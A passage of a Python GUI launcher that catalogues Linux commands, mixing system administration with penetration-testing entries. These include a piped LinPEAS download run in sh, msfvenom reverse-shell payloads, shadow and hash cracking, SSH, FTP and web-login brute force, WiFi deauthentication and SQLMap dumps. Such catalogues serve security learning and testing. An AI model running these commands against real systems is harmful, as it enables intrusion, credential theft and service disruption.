#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         LINUX COMMAND CENTER — ALL-IN-ONE TERMINAL SUITE        ║
║                  Developer: Demiyan Dissanayake                  ║
║                        Version: 3.0 PRO                          ║
╚══════════════════════════════════════════════════════════════════╝
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, font
import subprocess
import threading
import os
import platform
import datetime
import glob
import time

# ─────────────────────────────────────────────────────────────────
#  THEME
# ─────────────────────────────────────────────────────────────────
THEME = {
    "bg":           "#0a0e1a",
    "bg2":          "#0f1526",
    "bg3":          "#141c30",
    "panel":        "#111827",
    "accent":       "#00d4ff",
    "accent2":      "#ff6b35",
    "accent3":      "#39ff14",
    "accent4":      "#b347ea",
    "text":         "#e2e8f0",
    "text_dim":     "#64748b",
    "text_bright":  "#ffffff",
    "warning":      "#fbbf24",
    "danger":       "#ef4444",
    "success":      "#22c55e",
    "border":       "#1e2d4a",
    "hover":        "#1a2540",
    "selected":     "#0d2137",
    "terminal_bg":  "#050810",
    "terminal_fg":  "#00ff88",
}

# ─────────────────────────────────────────────────────────────────
#  COMMAND DATABASE
# ─────────────────────────────────────────────────────────────────
COMMANDS = {

    "💻 System Info": {
        "color": THEME["accent"],
        "commands": [
            ("OS & Kernel Info",              "uname -a"),
            ("Distro Info",                   "cat /etc/os-release"),
            ("CPU Info",                      "lscpu"),
            ("CPU Temperature",               "sensors 2>/dev/null || cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null | awk '{print $1/1000\"°C\"}'"),
            ("Memory Info",                   "free -h"),
            ("Memory Detail",                 "cat /proc/meminfo | head -30"),
            ("Disk Usage",                    "df -h"),
            ("Uptime",                        "uptime -p"),
            ("Current User",                  "whoami && id"),
            ("Logged-in Users",               "who -a"),
            ("Environment Variables",         "printenv"),
            ("Hostname",                      "hostname -f"),
            ("System Load",                   "top -bn1 | head -20"),
            ("Hardware Summary",              "lshw -short 2>/dev/null || dmidecode -t system 2>/dev/null"),
            ("PCI Devices",                   "lspci"),
            ("USB Devices",                   "lsusb"),
            ("Block Devices",                 "lsblk -a"),
            ("Mounted Filesystems",           "mount | column -t"),
            ("Swap Info",                     "swapon --show"),
            ("System Limits",                 "ulimit -a"),
            ("BIOS Info",                     "sudo dmidecode -t bios 2>/dev/null | head -20"),
            ("Memory Slots",                  "sudo dmidecode -t memory 2>/dev/null | grep -E 'Size|Speed|Type' | head -20"),
            ("Boot Time",                     "who -b"),
            ("Kernel Parameters",             "sysctl -a 2>/dev/null | head -40"),
            ("CPU Flags",                     "grep flags /proc/cpuinfo | head -1"),
            ("System Entropy",                "cat /proc/sys/kernel/random/entropy_avail"),
        ]
    },

    "🌐 Network": {
        "color": THEME["accent2"],
        "commands": [
            ("All Interfaces",                "ip a"),
            ("Routing Table",                 "ip route"),
            ("ARP Table",                     "arp -n"),
            ("Active Connections",            "ss -tunapl"),
            ("Listening Ports",               "ss -tlnp"),
            ("TCP Connection States",         "ss -s"),
            ("DNS Config",                    "cat /etc/resolv.conf"),
            ("Hosts File",                    "cat /etc/hosts"),
            ("Ping Google",                   "ping -c 4 8.8.8.8"),
            ("Traceroute Google",             "traceroute 8.8.8.8 2>/dev/null || tracepath 8.8.8.8"),
            ("Public IP",                     "curl -s ifconfig.me && echo"),
            ("GeoIP Lookup",                  "curl -s https://ipinfo.io && echo"),
            ("Network Stats",                 "netstat -s 2>/dev/null | head -40"),
            ("WiFi Networks",                 "nmcli dev wifi list 2>/dev/null || iwlist scan 2>/dev/null | head -50"),
            ("WiFi Status",                   "nmcli -t -f ACTIVE,SSID,SIGNAL dev wifi 2>/dev/null"),
            ("Network Interfaces",            "nmcli device status 2>/dev/null"),
            ("Firewall Rules (iptables)",     "iptables -L -n -v 2>/dev/null"),
            ("Firewall (ufw)",                "ufw status verbose 2>/dev/null"),
            ("nftables Rules",                "nft list ruleset 2>/dev/null"),
            ("DNS Lookup",                    "nslookup google.com"),
            ("Dig DNS Query",                 "dig google.com ANY +short 2>/dev/null"),
            ("WHOIS (google.com)",            "whois google.com 2>/dev/null | head -30"),
            ("HTTP Headers",                  "curl -I https://example.com"),
            ("IPv6 Addresses",                "ip -6 addr"),
            ("MAC Addresses",                 "ip link show | grep 'link/ether'"),
            ("Network Neighbors",             "ip neigh show"),
            ("Bandwidth Stats",               "cat /proc/net/dev | column -t"),
        ]
    },

    "⚙️ Processes": {
        "color": THEME["accent3"],
        "commands": [
            ("All Processes",                 "ps aux --sort=-%cpu | head -30"),
            ("Process Tree",                  "pstree -p 2>/dev/null || ps auxf | head -40"),
            ("Top by CPU",                    "ps aux --sort=-%cpu | head -20"),
            ("Top by Memory",                 "ps aux --sort=-%mem | head -20"),
            ("Kill by Name",                  "# killall PROCESS_NAME"),
            ("Kill by PID",                   "# kill -9 PID"),
            ("Background Jobs",               "jobs -l"),
            ("Cron Jobs (user)",              "crontab -l 2>/dev/null"),
            ("System Cron Jobs",              "ls -la /etc/cron* /var/spool/cron/ 2>/dev/null"),
            ("Running Services",              "systemctl list-units --type=service --state=running"),
            ("All Services",                  "systemctl list-units --type=service"),
            ("Failed Services",               "systemctl --failed"),
            ("SSH Service Status",            "systemctl status ssh 2>/dev/null || systemctl status sshd 2>/dev/null"),
            ("Start Service",                 "# sudo systemctl start SERVICE_NAME"),
            ("Stop Service",                  "# sudo systemctl stop SERVICE_NAME"),
            ("Restart Service",               "# sudo systemctl restart SERVICE_NAME"),
            ("Enable at Boot",                "# sudo systemctl enable SERVICE_NAME"),
            ("Disable Service",               "# sudo systemctl disable SERVICE_NAME"),
            ("Daemon Reload",                 "# sudo systemctl daemon-reload"),
            ("Zombie Processes",              "ps aux | awk '{if ($8==\"Z\") print}' | head -20"),
            ("Process by Nice",               "ps -eo pid,ni,comm --sort ni | head -20"),
            ("Open File Descriptors",         "ls /proc/$$/fd | wc -l"),
        ]
    },

    "📁 File System": {
        "color": THEME["accent4"],
        "commands": [
            ("List Current Dir",              "ls -lahF --color=never"),
            ("Tree View (2 levels)",          "tree -L 2 2>/dev/null || find . -maxdepth 2 | head -60"),
            ("Find Large Files (>100MB)",     "find / -type f -size +100M 2>/dev/null | head -20"),
            ("Find SUID Files",               "find / -perm -4000 -type f 2>/dev/null"),
            ("Find World-Writable",           "find / -perm -0002 -type f 2>/dev/null | head -20"),
            ("Disk Usage by Dir",             "du -sh /* 2>/dev/null | sort -rh | head -20"),
            ("Recently Modified Files",       "find / -mtime -1 -type f 2>/dev/null | grep -v proc | head -30"),
            ("Open Files (lsof)",             "lsof 2>/dev/null | head -40"),
            ("Inode Usage",                   "df -i"),
            ("/tmp Contents",                 "ls -laht /tmp/"),
            ("Hidden Files (home)",           "ls -lah ~/"),
            ("File Permissions Check",        "stat /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null"),
            ("Sticky Bit Files",              "find / -perm -1000 -type d 2>/dev/null | head -20"),
            ("Find Config Files",             "find /etc /opt /var/www -name '*.conf' 2>/dev/null | head -20"),
            ("Find Backup Files",             "find / -name '*.bak' -o -name '*.old' 2>/dev/null | head -20"),
            ("Largest Directories",           "du -sh /home/* /var/* 2>/dev/null | sort -rh | head -15"),
            ("Find Orphaned Files",           "find / -nouser -o -nogroup 2>/dev/null | head -20"),
            ("SMART Disk Status",             "sudo smartctl -a /dev/sda 2>/dev/null | head -30"),
        ]
    },

    "👤 Users & Perms": {
        "color": "#f59e0b",
        "commands": [
            ("All Users",                     "cat /etc/passwd | column -t -s:"),
            ("All Groups",                    "cat /etc/group | column -t -s:"),
            ("Current User Detail",           "id && groups"),
            ("Sudo Users",                    "cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'"),
            ("Sudo Group Members",            "getent group sudo 2>/dev/null"),
            ("Last Logins",                   "last | head -20"),
            ("Failed Login Attempts",         "lastb 2>/dev/null | head -20 || grep 'Failed' /var/log/auth.log 2>/dev/null | tail -20"),
            ("Shadow File (root only)",       "sudo cat /etc/shadow 2>/dev/null | head -20"),
            ("Add User",                      "# sudo useradd -m -s /bin/bash USERNAME"),
            ("Delete User",                   "# sudo userdel -r USERNAME"),
            ("Change Password",               "# sudo passwd USERNAME"),
            ("Add to sudo",                   "# sudo usermod -aG sudo USERNAME"),
            ("Lock User",                     "# sudo usermod -L USERNAME"),
            ("Unlock User",                   "# sudo usermod -U USERNAME"),
            ("SSH Authorized Keys",           "cat ~/.ssh/authorized_keys 2>/dev/null"),
            ("Passwd Policy",                 "chage -l root 2>/dev/null"),
            ("Active Sessions (w)",           "w"),
            ("Login Shells",                  "cat /etc/shells"),
            ("Account Expiry",                "chage -l $USER 2>/dev/null"),
            ("PAM Modules",                   "ls /etc/pam.d/ 2>/dev/null"),
        ]
    },

    "📦 Packages": {
        "color": "#10b981",
        "commands": [
            ("Update Package List",           "sudo apt update 2>/dev/null || sudo yum check-update 2>/dev/null || sudo pacman -Sy 2>/dev/null"),
            ("Upgrade All",                   "sudo apt upgrade -y 2>/dev/null || sudo yum update -y 2>/dev/null"),
            ("Install Package",               "# sudo apt install PACKAGE_NAME"),
            ("Remove Package",                "# sudo apt remove PACKAGE_NAME"),
            ("Purge Package",                 "# sudo apt purge PACKAGE_NAME"),
            ("Search Package",                "# apt search QUERY"),
            ("List Installed",                "dpkg -l 2>/dev/null | head -40 || rpm -qa 2>/dev/null | head -40 || pacman -Q 2>/dev/null | head -40"),
            ("Show Package Info",             "# apt show PACKAGE_NAME"),
            ("List Upgradable",               "apt list --upgradable 2>/dev/null | head -20"),
            ("Auto Remove",                   "sudo apt autoremove -y 2>/dev/null"),
            ("Clean Cache",                   "sudo apt clean 2>/dev/null"),
            ("Fix Broken",                    "sudo apt --fix-broken install 2>/dev/null"),
            ("Snap Packages",                 "snap list 2>/dev/null"),
            ("Flatpak Packages",              "flatpak list 2>/dev/null"),
            ("pip Packages",                  "pip3 list 2>/dev/null | head -30"),
            ("pip Outdated",                  "pip3 list --outdated 2>/dev/null | head -20"),
            ("npm Global",                    "npm list -g --depth=0 2>/dev/null"),
            ("gem List (Ruby)",               "gem list 2>/dev/null | head -20"),
            ("cargo List (Rust)",             "cargo install --list 2>/dev/null"),
        ]
    },

    "🔒 Security": {
        "color": THEME["danger"],
        "commands": [
            ("Open Ports (all)",              "ss -tunapl"),
            ("Listening Services",            "netstat -tlnp 2>/dev/null || ss -tlnp"),
            ("Firewall Status",               "ufw status verbose 2>/dev/null; iptables -L -n 2>/dev/null | head -30"),
            ("SELinux Status",                "getenforce 2>/dev/null; sestatus 2>/dev/null"),
            ("AppArmor Status",               "apparmor_status 2>/dev/null || aa-status 2>/dev/null"),
            ("Auth Logs",                     "sudo tail -50 /var/log/auth.log 2>/dev/null || sudo tail -50 /var/log/secure 2>/dev/null"),
            ("Syslog Tail",                   "sudo tail -50 /var/log/syslog 2>/dev/null"),
            ("SUID Binaries",                 "find / -perm -4000 2>/dev/null | xargs ls -la 2>/dev/null"),
            ("Writable /etc files",           "find /etc -writable 2>/dev/null | head -20"),
            ("Check Rootkits",                "sudo chkrootkit 2>/dev/null | grep INFECTED"),
            ("Rkhunter Check",                "sudo rkhunter --check --skip-keypress 2>/dev/null | tail -30"),
            ("Lynis Audit",                   "sudo lynis audit system --quick 2>/dev/null | tail -30"),
            ("GPG Keys",                      "gpg --list-keys 2>/dev/null"),
            ("SSL Certs Check",               "openssl x509 -in /etc/ssl/certs/ca-certificates.crt -text -noout 2>/dev/null | head -20"),
            ("Failed SSH Attempts",           "sudo grep 'sshd.*Failed' /var/log/auth.log 2>/dev/null | tail -20"),
            ("PAM Config",                    "cat /etc/pam.d/common-auth 2>/dev/null"),
            ("Capabilities Check",            "getcap -r / 2>/dev/null | head -20"),
            ("Audit Rules",                   "sudo auditctl -l 2>/dev/null | head -20"),
            ("Sudoers Check",                 "sudo -l 2>/dev/null"),
            ("Kernel Security",               "sysctl kernel.randomize_va_space kernel.dmesg_restrict 2>/dev/null"),
        ]
    },

    "🚀 PrivEsc": {
        "color": "#dc2626",
        "commands": [
            ("Sudo Permissions",              "sudo -l 2>/dev/null"),
            ("SUID Binaries",                 "find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null"),
            ("SGID Binaries",                 "find / -perm -2000 -type f 2>/dev/null | xargs ls -la 2>/dev/null"),
            ("World-Writable Dirs",           "find / -perm -0002 -type d 2>/dev/null | head -20"),
            ("All Cron Jobs",                 "cat /etc/crontab; ls -la /etc/cron*; cat /var/spool/cron/crontabs/* 2>/dev/null"),
            ("Writable Cron Scripts",         "find /etc/cron* -writable 2>/dev/null"),
            ("PATH Variable",                 "echo $PATH"),
            ("Capabilities",                  "getcap -r / 2>/dev/null"),
            ("Docker Group Check",            "id | grep docker && ls -la /var/run/docker.sock 2>/dev/null"),
            ("LXD Group Check",               "id | grep lxd 2>/dev/null"),
            ("NFS Shares",                    "cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null"),
            ("Writable /etc/passwd",          "ls -la /etc/passwd; stat /etc/passwd"),
            ("PATH Writable Scripts",         "for d in $(echo $PATH | tr ':' ' '); do find $d -writable 2>/dev/null; done"),
            ("Passwords in Files",            "grep -r 'password\\|passwd\\|secret\\|token' /home/ /var/www/ /opt/ 2>/dev/null | grep -v Binary | head -20"),
            ("SSH Keys Hunt",                 "find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null"),
            (".bashrc / .profile",            "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null"),
            ("Root Services",                 "ps aux | grep root | grep -v \\["),
            ("Installed Compilers",           "which gcc g++ python3 perl ruby 2>/dev/null"),
            ("LinPEAS (run)",                 "# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
            ("LinEnum Script",                "# bash linenum.sh 2>/dev/null"),
            ("GTFOBins Check",                "sudo -l 2>/dev/null && find / -perm -4000 2>/dev/null | head -20"),
            ("Kernel Version (exploits)",     "uname -r"),
            ("Polkit Check",                  "dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null"),
        ]
    },

    "🎯 Metasploit": {
        "color": "#dc2626",
        "commands": [
            ("Start MSF Console",             "msfconsole"),
            ("Start MSF (quiet)",             "msfconsole -q"),
            ("Update Metasploit",             "sudo apt update && sudo apt install metasploit-framework -y 2>/dev/null"),
            ("MSF Version",                   "msfconsole -v 2>/dev/null"),
            ("Start PostgreSQL",              "sudo service postgresql start && msfdb init 2>/dev/null"),
            ("MSF DB Status",                 "msfdb status 2>/dev/null"),
            ("Search EternalBlue",            "msfconsole -q -x 'search ms17_010; exit'"),
            ("EternalBlue Setup",             "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; show options; exit'"),
            ("Meterpreter Payload",           "msfconsole -q -x 'use payload/windows/x64/meterpreter/reverse_tcp; show options; exit'"),
            ("List Payloads",                 "msfconsole -q -x 'show payloads; exit' 2>/dev/null | head -40"),
            ("msfvenom Formats",              "msfvenom -l formats 2>/dev/null | head -30"),
            ("msfvenom Win EXE",              "# msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe"),
            ("msfvenom Linux ELF",            "# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf"),
            ("msfvenom Android APK",          "# msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 R > app.apk"),
            ("msfvenom PHP Payload",          "# msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php"),
            ("msfvenom Python Payload",       "# msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.py"),
            ("msfvenom WAR Payload",          "# msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war > shell.war"),
            ("Multi Handler",                 "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; show options; exit'"),
            ("Scan SMB",                      "# msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS TARGET; run; exit'"),
            ("Port Scanner",                  "# msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS TARGET; run; exit'"),
            ("SSH Brute Force",               "# msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit'"),
            ("FTP Brute Force",               "# msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS TARGET; set USER_FILE /path/users.txt; set PASS_FILE /path/pass.txt; run; exit'"),
            ("HTTP Dir Scanner",              "# msfconsole -q -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS TARGET; run; exit'"),
        ]
    },

    "🔍 Nmap & Recon": {
        "color": "#7c3aed",
        "commands": [
            ("Nmap Version",                  "nmap --version"),
            ("Quick Scan",                    "# nmap -T4 TARGET"),
            ("Full Port Scan",                "# nmap -p- -T4 TARGET"),
            ("Service & Version Scan",        "# nmap -sV -sC -T4 TARGET"),
            ("OS Detection",                  "# sudo nmap -O TARGET"),
            ("Aggressive Scan",               "# sudo nmap -A -T4 TARGET"),
            ("UDP Scan",                      "# sudo nmap -sU --top-ports 100 TARGET"),
            ("Stealth SYN Scan",              "# sudo nmap -sS -T4 TARGET"),
            ("Vulnerability Scan",            "# nmap --script vuln TARGET"),
            ("SMB Vuln Check",                "# nmap --script smb-vuln* TARGET"),
            ("Heartbleed Check",              "# nmap --script ssl-heartbleed TARGET"),
            ("Scan Network Range",            "# nmap -sn 192.168.1.0/24"),
            ("DNS Brute Force",               "# nmap --script dns-brute TARGET"),
            ("HTTP Enum",                     "# nmap --script http-enum TARGET"),
            ("Nmap Output to File",           "# nmap -oA scan_results TARGET"),
            ("Masscan (fast)",                "# sudo masscan -p0-65535 TARGET --rate=1000"),
            ("Nikto Web Scan",                "# nikto -h http://TARGET"),
            ("Gobuster Dir",                  "# gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt"),
            ("Gobuster Vhost",                "# gobuster vhost -u http://TARGET -w /usr/share/wordlists/subdomains.txt"),
            ("FFUF Fuzz",                     "# ffuf -w wordlist.txt -u http://TARGET/FUZZ"),
            ("Dirb Scan",                     "# dirb http://TARGET"),
            ("WhatWeb Fingerprint",           "# whatweb TARGET"),
            ("theHarvester",                  "# theHarvester -d TARGET -b all 2>/dev/null"),
            ("Subfinder",                     "# subfinder -d TARGET 2>/dev/null"),
            ("DNSrecon",                      "# dnsrecon -d TARGET -t std 2>/dev/null"),
            ("Enum4linux",                    "# enum4linux -a TARGET"),
        ]
    },

    "🔓 Password Tools": {
        "color": "#b45309",
        "commands": [
            ("John — Help",                   "john --help 2>/dev/null | head -30"),
            ("John — Crack Shadow",           "# sudo john /etc/shadow"),
            ("John — Wordlist Attack",        "# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"),
            ("John — Show Cracked",           "# john --show hash.txt"),
            ("John — List Formats",           "john --list=formats 2>/dev/null | head -20"),
            ("John — Incremental",            "# john --incremental hash.txt"),
            ("Hashcat — Help",                "hashcat --help 2>/dev/null | head -30"),
            ("Hashcat — MD5",                 "# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt"),
            ("Hashcat — SHA1",                "# hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt"),
            ("Hashcat — SHA256",              "# hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt"),
            ("Hashcat — NTLM",                "# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt"),
            ("Hashcat — WPA2",                "# hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt"),
            ("Hashcat — bcrypt",              "# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"),
            ("Hydra — SSH",                   "# hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET ssh"),
            ("Hydra — FTP",                   "# hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET ftp"),
            ("Hydra — HTTP POST",             "# hydra -l user -P wordlist.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
            ("Medusa",                        "# medusa -h TARGET -u user -P wordlist.txt -M ssh"),
            ("Wordlists Location",            "ls /usr/share/wordlists/ 2>/dev/null"),
            ("crunch Wordlist",               "# crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt"),
            ("CeWL Wordlist",                 "# cewl http://TARGET -d 2 -m 5 -w wordlist.txt"),
            ("Identify Hash",                 "# hash-identifier HASH_VALUE"),
        ]
    },

    "📡 Wireless": {
        "color": "#0891b2",
        "commands": [
            ("Wireless Interfaces",           "iwconfig 2>/dev/null || iw dev"),
            ("Scan WiFi",                     "sudo iwlist wlan0 scan 2>/dev/null | grep -E 'ESSID|Signal|Frequency'"),
            ("Monitor Mode ON",               "# sudo airmon-ng start wlan0"),
            ("Monitor Mode OFF",              "# sudo airmon-ng stop wlan0mon"),
            ("Check Monitor Mode",            "iwconfig 2>/dev/null | grep Monitor"),
            ("Airodump-ng Scan",              "# sudo airodump-ng wlan0mon"),
            ("Capture WPA Handshake",         "# sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon"),
            ("Deauth Attack",                 "# sudo aireplay-ng -0 5 -a TARGET_BSSID wlan0mon"),
            ("WPA2 Crack (aircrack)",         "# aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt"),
            ("Bluetooth Scan",               "hcitool scan 2>/dev/null"),
            ("Bluetooth Devices",             "bluetoothctl devices 2>/dev/null"),
            ("Bluetooth Info",               "hciconfig -a 2>/dev/null"),
            ("PMKID Attack",                  "# hcxdumptool -i wlan0mon -o capture.pcapng"),
            ("Bettercap WiFi",               "# sudo bettercap -iface wlan0mon"),
            ("Kismet Start",                  "# sudo kismet"),
            ("WiFite Auto Attack",            "# sudo wifite"),
        ]
    },

    "🕷️ Web Exploit": {
        "color": "#b91c1c",
        "commands": [
            ("SQLMap — Basic",                "# sqlmap -u 'http://TARGET/page?id=1'"),
            ("SQLMap — POST",                 "# sqlmap -u 'http://TARGET/login' --data='user=admin&pass=test'"),
            ("SQLMap — Dump DBs",             "# sqlmap -u 'http://TARGET/page?id=1' --dbs"),
            ("SQLMap — Get Tables",           "# sqlmap -u 'http://TARGET/page?id=1' -D dbname --tables"),
            ("SQLMap — Dump Table",           "# sqlmap -u 'http://TARGET/page?id=1' -D dbname -T tablename --dump"),
            ("SQLMap — Risk/Level",           "# sqlmap -u 'http://TARGET/page?id=1' --risk=3 --level=5"),
            ("XSStrike",                      "# python3 xsstrike.py -u 'http://TARGET/page?q=test'"),
            ("Burp Suite",                    "# burpsuite &"),
            ("OWASP ZAP",                     "# zaproxy &"),
            ("wfuzz",                         "# wfuzz -c -z file,wordlist.txt http://TARGET/FUZZ"),
            ("FFUF Fuzz",                     "# ffuf -w wordlist.txt -u http://TARGET/FUZZ"),
            ("FFUF Header Fuzz",              "# ffuf -w wordlist.txt -u http://TARGET -H 'Host: FUZZ.TARGET'"),
            ("Wafw00f WAF",                   "# wafw00f http://TARGET"),
            ("Commix CMDi",                   "# commix --url='http://TARGET/page?cmd=test'"),
            ("BeEF XSS",                      "# sudo beef-xss"),
            ("LFI Test",                      "# curl 'http://TARGET/page?file=../../../../etc/passwd'"),
            ("SSRF Test",                     "# curl 'http://TARGET/fetch?url=http://127.0.0.1:22'"),
            ("CORS Check",                    "# curl -I -H 'Origin: http://evil.com' http://TARGET/api/"),
            ("JWT Decode",                    "# python3 -c \"import base64,json; t='JWT'; print(json.loads(base64.b64decode(t.split('.')[1]+'==').decode()))\""),
            ("Shodan CLI",                    "# shodan search 'apache port:80 country:LK'"),
        ]
    },

    "🧪 Forensics": {
        "color": "#059669",
        "commands": [
            ("Volatility — Image Info",       "# volatility -f memory.raw imageinfo"),
            ("Volatility — Process List",     "# volatility -f memory.raw --profile=PROFILE pslist"),
            ("Volatility — Network",          "# volatility -f memory.raw --profile=PROFILE connections"),
            ("Volatility3 — WinInfo",         "# python3 vol.py -f memory.raw windows.info"),
            ("Strings from Binary",           "# strings suspicious_file"),
            ("Strings (Unicode)",             "# strings -el suspicious_file"),
            ("Hex Dump",                      "# xxd suspicious_file | head -30"),
            ("File Type Check",               "# file suspicious_file"),
            ("Binwalk Analysis",              "# binwalk suspicious_file"),
            ("Binwalk Extract",               "# binwalk -e suspicious_file"),
            ("Steghide Check",                "# steghide info image.jpg"),
            ("Steghide Extract",              "# steghide extract -sf image.jpg"),
            ("Exiftool Metadata",             "# exiftool file"),
            ("Foremost Carving",              "# foremost -i disk.img -o output/"),
            ("Scalpel Carving",               "# scalpel disk.img -o output/"),
            ("Wireshark",                     "wireshark &"),
            ("Tcpdump Capture",               "# sudo tcpdump -i eth0 -w capture.pcap"),
            ("Tcpdump Read",                  "# tcpdump -r capture.pcap"),
            ("Tshark HTTP GET",               "# tshark -r capture.pcap -Y 'http.request.method==GET'"),
            ("Live Traffic",                  "sudo tcpdump -i any -nn -v 2>/dev/null | head -30"),
            ("Autopsy",                       "# autopsy &"),
            ("dd Disk Image",                 "# sudo dd if=/dev/sdX of=disk.img bs=4M status=progress"),
            ("md5sum",                        "# md5sum file"),
            ("sha256sum",                     "# sha256sum file"),
            ("Timeline MAC",                  "# find / -printf '%T+ %p\n' 2>/dev/null | sort | tail -50"),
        ]
    },

    "🔬 Reverse Eng": {
        "color": "#6d28d9",
        "commands": [
            ("File Type",                     "# file binary"),
            ("ELF Headers",                   "# readelf -h binary"),
            ("ELF Symbols",                   "# readelf -s binary"),
            ("ELF Sections",                  "# readelf -S binary"),
            ("Disassemble (objdump)",          "# objdump -d binary | head -60"),
            ("Strings — Keywords",            "# strings binary | grep -E '(http|pass|key|secret|flag)'"),
            ("ltrace",                        "# ltrace ./binary"),
            ("strace",                        "# strace ./binary"),
            ("GDB",                           "# gdb ./binary"),
            ("GDB with PEDA",                 "# gdb -q -ex 'source ~/.gdbinit' ./binary"),
            ("Ghidra",                        "# ghidraRun &"),
            ("Radare2 Analysis",              "# r2 -A binary"),
            ("Radare2 — Print Main",          "# r2 -A binary -q -c 'pdf @main'"),
            ("Checksec",                      "# checksec --file=binary 2>/dev/null || pwn checksec binary 2>/dev/null"),
            ("ROPgadget",                     "# ROPgadget --binary binary 2>/dev/null | head -30"),
            ("pwntools Template",             "# python3 -c \"from pwn import *; r = process('./binary'); r.interactive()\""),
            ("Detect Packing",                "# upx -d binary 2>/dev/null || echo 'Try manual analysis'"),
            ("Dynamic Libs",                  "# ldd binary"),
            ("Anti-Debug Check",              "# strings binary | grep -E '(ptrace|IsDebuggerPresent)'"),
        ]
    },

    "🔗 SSH & Remote": {
        "color": "#1d4ed8",
        "commands": [
            ("SSH Connect",                   "# ssh user@TARGET"),
            ("SSH with Key",                  "# ssh -i ~/.ssh/id_rsa user@TARGET"),
            ("SSH Custom Port",               "# ssh -p PORT user@TARGET"),
            ("SSH Verbose",                   "# ssh -vvv user@TARGET"),
            ("SSH Jump Host",                 "# ssh -J jumpuser@JUMP user@TARGET"),
            ("Generate ed25519 Key",          "ssh-keygen -t ed25519 -C 'your@email.com'"),
            ("Generate RSA 4096 Key",         "ssh-keygen -t rsa -b 4096 -C 'your@email.com'"),
            ("Copy SSH Key",                  "# ssh-copy-id user@TARGET"),
            ("SSH Tunnel (Local)",            "# ssh -L 8080:localhost:80 user@TARGET"),
            ("SSH Tunnel (Remote)",           "# ssh -R 8080:localhost:80 user@TARGET"),
            ("SSH SOCKS Proxy",               "# ssh -D 9050 user@TARGET"),
            ("SCP Upload",                    "# scp file.txt user@TARGET:/path/"),
            ("SCP Download",                  "# scp user@TARGET:/path/file.txt ./"),
            ("SCP Recursive",                 "# scp -r folder/ user@TARGET:/path/"),
            ("Rsync Sync",                    "# rsync -avz /local/ user@TARGET:/remote/"),
            ("Rsync over SSH",                "# rsync -avz -e ssh /local/ user@TARGET:/remote/"),
            ("SSH Config",                    "cat ~/.ssh/config 2>/dev/null"),
            ("Known Hosts",                   "cat ~/.ssh/known_hosts 2>/dev/null | head -20"),
            ("SSH Keyscan",                   "# ssh-keyscan TARGET"),
            ("Netcat Listener",               "# nc -lvnp 4444"),
            ("Netcat Connect",                "# nc TARGET 4444"),
            ("Socat Redirect",                "# socat TCP-LISTEN:4444,fork TCP:TARGET:4444"),
        ]
    },

    "🏁 CTF Tools": {
        "color": "#f59e0b",
        "commands": [
            ("Base64 Encode",                 "# echo 'text' | base64"),
            ("Base64 Decode",                 "# echo 'dGV4dA==' | base64 -d"),
            ("Base32 Decode",                 "# echo 'ORSXG5A=' | base32 -d"),
            ("ROT13",                         "# echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"),
            ("Caesar All Shifts",             "# python3 -c \"s='CIPHER'; [print(i,''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]\""),
            ("Hex Encode",                    "# echo 'text' | xxd -p"),
            ("Hex Decode",                    "# echo '74657874' | xxd -r -p"),
            ("URL Decode",                    "# python3 -c \"import urllib.parse; print(urllib.parse.unquote('URL'))\""),
            ("URL Encode",                    "# python3 -c \"import urllib.parse; print(urllib.parse.quote('text'))\""),
            ("MD5 Hash",                      "# echo -n 'text' | md5sum"),
            ("SHA1 Hash",                     "# echo -n 'text' | sha1sum"),
            ("SHA256 Hash",                   "# echo -n 'text' | sha256sum"),
            ("RSA Pubkey",                    "# openssl rsa -in key.pem -pubout"),
            ("RSA Encrypt",                   "# openssl rsautl -encrypt -inkey pub.pem -pubin -in plain.txt -out enc.bin"),
